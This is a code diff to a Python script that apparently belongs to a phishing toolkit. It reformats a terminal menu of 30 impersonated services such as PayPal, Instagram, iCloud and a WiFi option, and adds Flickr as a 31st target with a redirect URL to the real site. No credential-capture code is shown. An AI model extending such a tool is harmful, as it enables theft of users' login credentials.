@@ -188,13 +188,16 @@ def main():
     s3 = colored('''
               
 
-[1] ADOBE       [6] FACEBOOK        [11] INSTAGRAM    [16] PAYPAL        [21] TWITCH       [26] ORIGIN
-[2] AMAZON      [7] GITHUB          [12] LINKEDIN     [17] PINTEREST     [22] TWITTER      [27] CRYPTOCOIN
-[3] APPLE ID    [8] GOOGLE          [13] MESSENGER    [18] PROTONMAIL    [23] WORDPRESS    [28] STACKOVERFLOW
-[4] WIFI        [9] iCLOUD          [14] MICROSOFT    [19] SNAPCHAT      [24] YAHOO        [29] NGROK
-[5] DROPBOX     [10] IGFOLLOWERS    [15] NETFLIX      [20] STEAM         [25] EBAY         [30] REDDIT
-
-[q/Q] QUIT
+[1] ADOBE           [11] INSTAGRAM     [21] TWITCH           [31] FLICKR   
+[2] AMAZON          [12] LINKEDIN      [22] TWITTER          [q/Q] QUIT
+[3] APPLE ID        [13] MESSENGER     [23] WORDPRESS    
+[4] WIFI            [14] MICROSOFT     [24] YAHOO        
+[5] DROPBOX         [15] NETFLIX       [25] EBAY         
+[6] FACEBOOK        [16] PAYPAL        [26] ORIGIN
+[7] GITHUB          [17] PINTEREST     [27] CRYPTOCOIN
+[8] GOOGLE          [18] PROTONMAIL    [28] STACKOVERFLOW    
+[9] iCLOUD          [19] SNAPCHAT      [29] NGROK
+[10] IGFOLLOWERS    [20] STEAM         [30] REDDIT
 
 ''','green',attrs=['bold'])
     print(s1+s2+s3,end='\n\n')
@@ -228,7 +231,8 @@ def main():
         27 : 'cryptocoin',
         28 : 'stackoverflow',
         29 : 'ngrok',
-        30 : 'reddit'
+        30 : 'reddit',
+        31 : 'flickr'
     }
     links = {
         'apple' : 'https://www.apple.com/shop/bag',
@@ -259,7 +263,8 @@ def main():
         'cryptocoin' : 'https://www.cryptocoin.pro/',
         'stackoverflow' : 'https://stackoverflow.com/',
         'ngrok' : 'https://ngrok.com/',
-        'reddit' : 'https://www.reddit.com/'
+        'reddit' : 'https://www.reddit.com/',
+        'flickr' : 'https://www.flickr.com'
     }
     while 1:        
         print(colored('[*] Select your choice : ','green',attrs=['bold']),end='')
